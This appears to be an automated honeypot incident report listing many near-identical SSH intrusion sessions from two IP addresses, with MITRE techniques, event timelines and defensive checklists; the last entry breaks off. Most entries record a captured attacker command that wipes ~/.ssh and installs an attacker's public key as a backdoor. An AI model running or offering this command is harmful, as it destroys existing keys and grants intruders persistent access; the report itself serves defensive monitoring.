### 🔴 HIGH · IR-61c56cc28618

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 19:05 |
| **Last Seen** | 2026-04-21 19:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:05:09` | `cowrie.session.connect` |
| `2026-04-21 19:05:09` | `cowrie.client.version` |
| `2026-04-21 19:05:09` | `cowrie.client.kex` |
| `2026-04-21 19:05:10` | `cowrie.login.success` |
| `2026-04-21 19:05:10` | `cowrie.session.params` |
| `2026-04-21 19:05:10` | `cowrie.command.input` |
| `2026-04-21 19:05:10` | `cowrie.command.failed` |
| `2026-04-21 19:05:10` | `cowrie.log.closed` |
| `2026-04-21 19:05:10` | `cowrie.session.params` |
| `2026-04-21 19:05:10` | `cowrie.command.input` |
| `2026-04-21 19:05:11` | `cowrie.session.file_download` |
| `2026-04-21 19:05:11` | `cowrie.log.closed` |
| `2026-04-21 19:05:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a965a21b8251

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 19:05 |
| **Last Seen** | 2026-04-21 19:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:05:13` | `cowrie.session.connect` |
| `2026-04-21 19:05:13` | `cowrie.client.version` |
| `2026-04-21 19:05:13` | `cowrie.client.kex` |
| `2026-04-21 19:05:13` | `cowrie.login.success` |
| `2026-04-21 19:05:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f4236742206

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 19:06 |
| **Last Seen** | 2026-04-21 19:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:06:52` | `cowrie.session.connect` |
| `2026-04-21 19:06:52` | `cowrie.client.version` |
| `2026-04-21 19:06:52` | `cowrie.client.kex` |
| `2026-04-21 19:06:52` | `cowrie.login.success` |
| `2026-04-21 19:06:53` | `cowrie.session.params` |
| `2026-04-21 19:06:53` | `cowrie.command.input` |
| `2026-04-21 19:06:53` | `cowrie.command.failed` |
| `2026-04-21 19:06:53` | `cowrie.log.closed` |
| `2026-04-21 19:06:53` | `cowrie.session.params` |
| `2026-04-21 19:06:53` | `cowrie.command.input` |
| `2026-04-21 19:06:53` | `cowrie.session.file_download` |
| `2026-04-21 19:06:53` | `cowrie.log.closed` |
| `2026-04-21 19:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8cd7dd44008

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 19:06 |
| **Last Seen** | 2026-04-21 19:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:06:56` | `cowrie.session.connect` |
| `2026-04-21 19:06:56` | `cowrie.client.version` |
| `2026-04-21 19:06:56` | `cowrie.client.kex` |
| `2026-04-21 19:06:56` | `cowrie.login.success` |
| `2026-04-21 19:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2145a2e8241f

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 19:08 |
| **Last Seen** | 2026-04-21 19:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:08:34` | `cowrie.session.connect` |
| `2026-04-21 19:08:34` | `cowrie.client.version` |
| `2026-04-21 19:08:34` | `cowrie.client.kex` |
| `2026-04-21 19:08:34` | `cowrie.login.success` |
| `2026-04-21 19:08:35` | `cowrie.session.params` |
| `2026-04-21 19:08:35` | `cowrie.command.input` |
| `2026-04-21 19:08:35` | `cowrie.command.failed` |
| `2026-04-21 19:08:35` | `cowrie.log.closed` |
| `2026-04-21 19:08:35` | `cowrie.session.params` |
| `2026-04-21 19:08:35` | `cowrie.command.input` |
| `2026-04-21 19:08:35` | `cowrie.session.file_download` |
| `2026-04-21 19:08:35` | `cowrie.log.closed` |
| `2026-04-21 19:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aab4e3a91ea

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 19:08 |
| **Last Seen** | 2026-04-21 19:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:08:38` | `cowrie.session.connect` |
| `2026-04-21 19:08:38` | `cowrie.client.version` |
| `2026-04-21 19:08:38` | `cowrie.client.kex` |
| `2026-04-21 19:08:38` | `cowrie.login.success` |
| `2026-04-21 19:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68d70b64966a

| Field | Detail |
|---|---|
| **Source IP** | `4.247.141[.]61` |
| **First Seen** | 2026-04-21 19:09 |
| **Last Seen** | 2026-04-21 19:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:09:56` | `cowrie.session.connect` |
| `2026-04-21 19:09:56` | `cowrie.client.version` |
| `2026-04-21 19:09:56` | `cowrie.client.kex` |
| `2026-04-21 19:09:56` | `cowrie.login.success` |
| `2026-04-21 19:09:56` | `cowrie.session.params` |
| `2026-04-21 19:09:56` | `cowrie.command.input` |
| `2026-04-21 19:09:56` | `cowrie.command.failed` |
| `2026-04-21 19:09:56` | `cowrie.log.closed` |
| `2026-04-21 19:09:56` | `cowrie.session.params` |
| `2026-04-21 19:09:56` | `cowrie.command.input` |
| `2026-04-21 19:09:56` | `cowrie.session.file_download` |
| `2026-04-21 19:09:56` | `cowrie.log.closed` |
| `2026-04-21 19:09:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.247.141[.]61` to AbuseIPDB if not already reported
- [ ] Block `4.247.141[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-499776f5b22a

| Field | Detail |
|---|---|
| **Source IP** | `4.247.141[.]61` |
| **First Seen** | 2026-04-21 19:09 |
| **Last Seen** | 2026-04-21 19:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:09:57` | `cowrie.session.connect` |
| `2026-04-21 19:09:57` | `cowrie.client.version` |
| `2026-04-21 19:09:57` | `cowrie.client.kex` |
| `2026-04-21 19:09:57` | `cowrie.login.success` |
| `2026-04-21 19:09:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.247.141[.]61` to AbuseIPDB if not already reported
- [ ] Block `4.247.141[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e15cadad6cf6

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 19:11 |
| **Last Seen** | 2026-04-21 19:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:11:09` | `cowrie.session.connect` |
| `2026-04-21 19:11:09` | `cowrie.client.version` |
| `2026-04-21 19:11:09` | `cowrie.client.kex` |
| `2026-04-21 19:11:09` | `cowrie.login.success` |
| `2026-04-21 19:11:10` | `cowrie.session.params` |
| `2026-04-21 19:11:10` | `cowrie.command.input` |
| `2026-04-21 19:11:10` | `cowrie.command.failed` |
| `2026-04-21 19:11:10` | `cowrie.log.closed` |
| `2026-04-21 19:11:10` | `cowrie.session.params` |
| `2026-04-21 19:11:10` | `cowrie.command.input` |
| `2026-04-21 19:11:10` | `cowrie.session.file_download` |
| `2026-04-21 19:11:10` | `cowrie.log.closed` |
| `2026-04-21 19:11:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43346c17eb6e

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 19:11 |
| **Last Seen** | 2026-04-21 19:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:11:12` | `cowrie.session.connect` |
| `2026-04-21 19:11:12` | `cowrie.client.version` |
| `2026-04-21 19:11:13` | `cowrie.client.kex` |
| `2026-04-21 19:11:13` | `cowrie.login.success` |
| `2026-04-21 19:11:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2fcacea1e31

| Field | Detail |
|---|---|
| **Source IP** | `4.247.141[.]61` |
| **First Seen** | 2026-04-21 19:11 |
| **Last Seen** | 2026-04-21 19:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:11:52` | `cowrie.session.connect` |
| `2026-04-21 19:11:52` | `cowrie.client.version` |
| `2026-04-21 19:11:52` | `cowrie.client.kex` |
| `2026-04-21 19:11:52` | `cowrie.login.success` |
| `2026-04-21 19:11:52` | `cowrie.session.params` |
| `2026-04-21 19:11:52` | `cowrie.command.input` |
| `2026-04-21 19:11:52` | `cowrie.command.failed` |
| `2026-04-21 19:11:52` | `cowrie.log.closed` |
| `2026-04-21 19:11:52` | `cowrie.session.params` |
| `2026-04-21 19:11:52` | `cowrie.command.input` |
| `2026-04-21 19:11:52` | `cowrie.session.file_download` |
| `2026-04-21 19:11:52` | `cowrie.log.closed` |
| `2026-04-21 19:11:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.247.141[.]61` to AbuseIPDB if not already reported
- [ ] Block `4.247.141[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac1e246a4ee7

| Field | Detail |
|---|---|
| **Source IP** | `4.247.141[.]61` |
| **First Seen** | 2026-04-21 19:11 |
| **Last Seen** | 2026-04-21 19:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:11:53` | `cowrie.session.connect` |
| `2026-04-21 19:11:53` | `cowrie.client.version` |
| `2026-04-21 19:11:53` | `cowrie.client.kex` |
| `2026-04-21 19:11:53` | `cowrie.login.success` |
| `2026-04-21 19:11:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.247.141[.]61` to AbuseIPDB if not already reported
- [ ] Block `4.247.141[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b927b3331b0

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 19:12 |
| **Last Seen** | 2026-04-21 19:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:12:46` | `cowrie.session.connect` |
| `2026-04-21 19:12:46` | `cowrie.client.version` |
| `2026-04-21 19:12:46` | `cowrie.client.kex` |
| `2026-04-21 19:12:47` | `cowrie.login.success` |
| `2026-04-21 19:12:47` | `cowrie.session.params` |
| `2026-04-21 19:12:47` | `cowrie.command.input` |
| `2026-04-21 19:12:47` | `cowrie.command.failed` |
| `2026-04-21 19:12:47` | `cowrie.log.closed` |
| `2026-04-21 19:12:48` | `cowrie.session.params` |
| `2026-04-21 19:12:48` | `cowrie.command.input` |
| `2026-04-21 19:12:48` | `cowrie.session.file_download` |
| `2026-04-21 19:12:48` | `cowrie.log.closed` |
| `2026-04-21 19:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12ac239a846c

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 19:12 |
| **Last Seen** | 2026-04-21 19:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:12:50` | `cowrie.session.connect` |
| `2026-04-21 19:12:50` | `cowrie.client.version` |
| `2026-04-21 19:12:50` | `cowrie.client.kex` |
| `2026-04-21 19:12:51` | `cowrie.login.success` |
| `2026-04-21 19:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7750b912c947

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 19:13 |
| **Last Seen** | 2026-04-21 19:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:13:37` | `cowrie.session.connect` |
| `2026-04-21 19:13:37` | `cowrie.client.version` |
| `2026-04-21 19:13:38` | `cowrie.client.kex` |
| `2026-04-21 19:13:38` | `cowrie.login.success` |
| `2026-04-21 19:13:39` | `cowrie.session.params` |
| `2026-04-21 19:13:39` | `cowrie.command.input` |
| `2026-04-21 19:13:39` | `cowrie.command.failed` |
| `2026-04-21 19:13:39` | `cowrie.log.closed` |
| `2026-04-21 19:13:39` | `cowrie.session.params` |
| `2026-04-21 19:13:39` | `cowrie.command.input` |
| `2026-04-21 19:13:39` | `cowrie.session.file_download` |
| `2026-04-21 19:13:39` | `cowrie.log.closed` |
| `2026-04-21 19:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-558a592c2980

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-21 19:13 |
| **Last Seen** | 2026-04-21 19:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:13:41` | `cowrie.session.connect` |
| `2026-04-21 19:13:41` | `cowrie.client.version` |
| `2026-04-21 19:13:42` | `cowrie.client.kex` |
| `2026-04-21 19:13:42` | `cowrie.login.success` |
| `2026-04-21 19:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fdc55b7d4dc

| Field | Detail |
|---|---|
| **Source IP** | `4.247.141[.]61` |
| **First Seen** | 2026-04-21 19:13 |
| **Last Seen** | 2026-04-21 19:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:13:48` | `cowrie.session.connect` |
